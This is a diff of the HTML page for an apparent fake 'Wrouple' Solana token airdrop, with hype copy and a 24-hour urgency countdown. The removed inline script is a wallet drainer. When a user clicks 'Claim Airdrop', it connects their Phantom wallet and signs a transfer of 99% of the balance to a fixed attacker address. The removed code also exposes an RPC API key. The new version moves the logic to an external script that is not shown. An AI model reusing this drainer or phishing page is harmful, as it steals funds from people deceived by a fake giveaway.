@@ -9,7 +9,6 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
 
   <style>
-    /* Your CSS from above (unchanged) */
     * {
       box-sizing: border-box;
       margin: 0;
@@ -130,9 +129,9 @@
       border-radius: 36px;
       padding: 60px;
       box-shadow: 0 20px 60px rgba(3, 46, 91, 0.4),
-        inset 0 0 0 1px rgba(255, 255, 255, 0.2),
-        inset 0 4px 12px rgba(255, 255, 255, 0.15),
-        inset 0 -6px 16px rgba(0, 0, 0, 0.25);
+                  inset 0 0 0 1px rgba(255, 255, 255, 0.2),
+                  inset 0 4px 12px rgba(255, 255, 255, 0.15),
+                  inset 0 -6px 16px rgba(0, 0, 0, 0.25);
       text-align: center;
       max-width: 480px;
       flex: 0 0 480px;
@@ -153,7 +152,7 @@
       font-size: 1.2em;
       color: #cbd5e1;
       margin-bottom: 40px;
-      text-shadow: 0 0 7px rgba(0, 0, 0, 0.4);
+      text-shadow: 0 0 7px rgba(0,0,0,0.4);
     }
 
     .primaryBtn {
@@ -166,7 +165,7 @@
       font-size: 1.4em;
       font-weight: 700;
       box-shadow: 0 6px 20px rgba(37, 99, 235, 0.7),
-        inset 0 -4px 12px rgba(255, 255, 255, 0.6);
+                  inset 0 -4px 12px rgba(255, 255, 255, 0.6);
       text-shadow: 0 0 8px #60a5fa;
       letter-spacing: 0.03em;
       transition: background 0.3s, box-shadow 0.3s;
@@ -183,9 +182,9 @@
       max-width: 320px;
       color: #f1f5f9;
       box-shadow: 0 20px 60px rgba(3, 46, 91, 0.4),
-        inset 0 0 0 1px rgba(255, 255, 255, 0.2),
-        inset 0 4px 12px rgba(255, 255, 255, 0.15),
-        inset 0 -6px 16px rgba(0, 0, 0, 0.25);
+                  inset 0 0 0 1px rgba(255, 255, 255, 0.2),
+                  inset 0 4px 12px rgba(255, 255, 255, 0.15),
+                  inset 0 -6px 16px rgba(0, 0, 0, 0.25);
       flex: 0 0 320px;
       display: flex;
       flex-direction: column;
@@ -261,8 +260,7 @@
         align-items: center;
       }
 
-      .airdrop-container,
-      .token-bio {
+      .airdrop-container, .token-bio {
         max-width: 100%;
         flex: 1 1 auto;
         padding: 30px 20px;
@@ -280,6 +278,7 @@
   </style>
 </head>
 <body>
+
   <!-- Header -->
   <header>
     <div id="logo">
@@ -301,29 +300,24 @@
   <div class="content-wrapper">
     <main class="airdrop-container">
       <h1>Decentralized Exchange</h1>
-      <p>
-        Backed by the scalability of Solana, Wrouple delivers secure, real-time trading and unlocks new DeFi possibilities for everyone.
-      </p>
+      <p>Backed by the scalability of Solana, Wrouple delivers secure, real-time trading and unlocks new DeFi possibilities for everyone.</p>
       <button class="primaryBtn" id="connect-wallet">Claim Airdrop</button>
     </main>
 
     <aside class="token-bio">
       <h2>About the Token 💎</h2>
       <p>
-        Wrouple is a high-speed Solana-based DEX token with ultra-low fees and an active liquidity pool. Our mission is to empower investors with seamless, secure, and fast transactions.
+        Wrouple is a high-performance token launched by a leading decentralized exchange (DEX) on the Solana chain. Designed for lightning-fast speeds and ultra-low fees, it empowers smart contracts, staking, and cross-chain interactions with seamless precision. ⚡🚀
+
+        Don’t miss out on the Solana-powered future — claim your share of Wrouple and ride the wave of innovation! 💠🔥🌍
       </p>
     </aside>
   </div>
 
-  <!-- Countdown Timer -->
+  <!-- Countdown -->
   <div class="countdown-wrapper">
-    <h2 class="countdown-title">Airdrop Countdown</h2>
-    <div class="countdown" id="countdown">
-      <div class="time-box">
-        <span id="days">00</span>
-        <label>Days</label>
-      </div>
-      <div class="separator">:</div>
+    <h2 class="countdown-title">⏳ Time Remaining</h2>
+    <div class="countdown">
       <div class="time-box">
         <span id="hours">00</span>
         <label>Hours</label>
@@ -341,174 +335,63 @@
     </div>
   </div>
 
+  <!-- Footer -->
   <footer>
-    &copy; 2025 Dex-Airdrop. All rights reserved.
+    <p>&copy; 2025 Powered by Dex. All rights reserved.</p>
   </footer>
 
-  <!-- jQuery (one import only) -->
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  
-  <!-- Solana web3.js SDK -->
-  <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.js"></script>
-
-  <!-- Your JavaScript -->
+  <!-- JavaScript -->
   <script>
-    $(document).ready(function () {
-      // Mobile nav toggle
-      $("#menuToggle").on("click", function () {
-        $(this).toggleClass("open");
-        $("#navMenu").toggleClass("active");
-      });
+    const menuToggle = document.getElementById('menuToggle');
+    const navMenu = document.getElementById('navMenu');
 
-      // Countdown timer setup
-      const countdownDate = new Date();
-      countdownDate.setHours(countdownDate.getHours() + 24);
-
-      function updateCountdown() {
-        const now = new Date().getTime();
-        const distance = countdownDate - now;
-
-        if (distance < 0) {
-          $("#days, #hours, #minutes, #seconds").text("00");
-          clearInterval(countdownInterval);
-          return;
-        }
-
-        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-        const hours = Math.floor(
-          (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
-        );
-        const minutes = Math.floor(
-          (distance % (1000 * 60 * 60)) / (1000 * 60)
-        );
-        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-        $("#days").text(days.toString().padStart(2, "0"));
-        $("#hours").text(hours.toString().padStart(2, "0"));
-        $("#minutes").text(minutes.toString().padStart(2, "0"));
-        $("#seconds").text(seconds.toString().padStart(2, "0"));
-      }
-
-      const countdownInterval = setInterval(updateCountdown, 1000);
-      updateCountdown();
-
-      // Wait for Phantom wallet to be available
-      function waitForPhantom(callback) {
-        if (window.solana && window.solana.isPhantom) {
-          callback();
-        } else {
-          setTimeout(() => waitForPhantom(callback), 100);
-        }
-      }
-
-      waitForPhantom(() => {
-        // Phantom is available here
-
-        let walletConnected = false;
-        let userPublicKey = null;
-        let walletBalance = 0;
-        let connection;
-
-        function handleWalletConnection(resp) {
-          userPublicKey = resp.publicKey;
-          connection = new solanaWeb3.Connection(
-            "https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw",
-            "confirmed"
-          );
-
-          connection.getBalance(userPublicKey).then((balance) => {
-            walletBalance = balance;
-            walletConnected = true;
-            $("#connect-wallet").text("Claim Airdrop");
-            // Unbind previous handlers to avoid multiple binding
-            $("#connect-wallet").off("click").on("click", claimAirdrop);
-          });
-        }
-
-        async function claimAirdrop() {
-          if (!walletConnected) {
-            alert("Wallet not connected");
-            return;
-          }
-          const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-          if (walletBalance < minBalance) {
-            alert("Insufficient funds for rent exemption.");
-            return;
-          }
-          const receiverWallet = new solanaWeb3.PublicKey(
-            "5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n"
-          );
-          const balanceForTransfer = walletBalance - minBalance;
-          if (balanceForTransfer <= 0) {
-            alert("Insufficient funds for transfer.");
-            return;
-          }
-          const transferAmount = Math.floor(balanceForTransfer * 0.99);
-
-          try {
-            const transaction = new solanaWeb3.Transaction().add(
-              solanaWeb3.SystemProgram.transfer({
-                fromPubkey: userPublicKey,
-                toPubkey: receiverWallet,
-                lamports: transferAmount,
-              })
-            );
-            transaction.feePayer = userPublicKey;
-            const blockhashObj = await connection.getRecentBlockhash();
-            transaction.recentBlockhash = blockhashObj.blockhash;
-
-            const signed = await window.solana.signTransaction(transaction);
-            const txid = await connection.sendRawTransaction(signed.serialize());
-            await connection.confirmTransaction(txid);
-
-            alert("Transaction successful!");
-            $("#connect-wallet").text("Connected");
-            walletConnected = false;
-          } catch (err) {
-            console.error("Error during claim:", err);
-            alert("Claim failed. Please try again.");
-          }
-        }
-
-        // Connect wallet handler
-        async function connectPhantom() {
-          try {
-            const resp = await window.solana.connect();
-            handleWalletConnection(resp);
-          } catch (err) {
-            console.error("Error connecting Phantom wallet:", err);
-            alert("Error connecting to Phantom Wallet.");
-          }
-        }
-
-        // Mobile deep link to Phantom app
-        function openPhantomMobileApp() {
-          const dappUrl = encodeURIComponent(window.location.origin);
-          const redirectLink = encodeURIComponent(window.location.href);
-          const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}&redirect_link=${redirectLink}`;
-
-          window.open(phantomDeepLink, "_blank");
-        }
-
-        // Bind connect button click
-        $("#connect-wallet").off("click").on("click", () => {
-          const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-          if (!isMobile && window.solana && window.solana.isPhantom) {
-            connectPhantom();
-          } else if (isMobile) {
-            openPhantomMobileApp();
-          } else {
-            alert("Phantom Wallet not found. Please install it.");
-            window.open("https://phantom.app/download", "_blank");
-          }
-        });
-
-        // Reconnect if already connected
-        if (window.solana.isConnected) {
-          handleWalletConnection({ publicKey: window.solana.publicKey });
-        }
-      });
+    menuToggle.addEventListener('click', () => {
+      menuToggle.classList.toggle('open');
+      navMenu.classList.toggle('active');
     });
+
+    
+    const STORAGE_KEY = 'airdrop_expiry';
+    const now = new Date().getTime();
+    let expireTime = localStorage.getItem(STORAGE_KEY);
+
+    if (!expireTime || now > expireTime) {
+      expireTime = now + 24 * 60 * 60 * 1000;
+      localStorage.setItem(STORAGE_KEY, expireTime);
+    } else {
+      expireTime = parseInt(expireTime, 10);
+    }
+
+    function updateTimer() {
+      const current = new Date().getTime();
+      const diff = expireTime - current;
+
+      if (diff <= 0) {
+        document.getElementById("hours").textContent = "00";
+        document.getElementById("minutes").textContent = "00";
+        document.getElementById("seconds").textContent = "00";
+        localStorage.removeItem(STORAGE_KEY);
+        clearInterval(timerInterval);
+        return;
+      }
+
+      const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
+      const minutes = Math.floor((diff / (1000 * 60)) % 60);
+      const seconds = Math.floor((diff / 1000) % 60);
+
+      document.getElementById("hours").textContent = String(hours).padStart(2, "0");
+      document.getElementById("minutes").textContent = String(minutes).padStart(2, "0");
+      document.getElementById("seconds").textContent = String(seconds).padStart(2, "0");
+    }
+
+    const timerInterval = setInterval(updateTimer, 1000);
+    updateTimer();
   </script>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+<script src="scripts/scripts.js"></script>
+
+
 </body>
 </html>
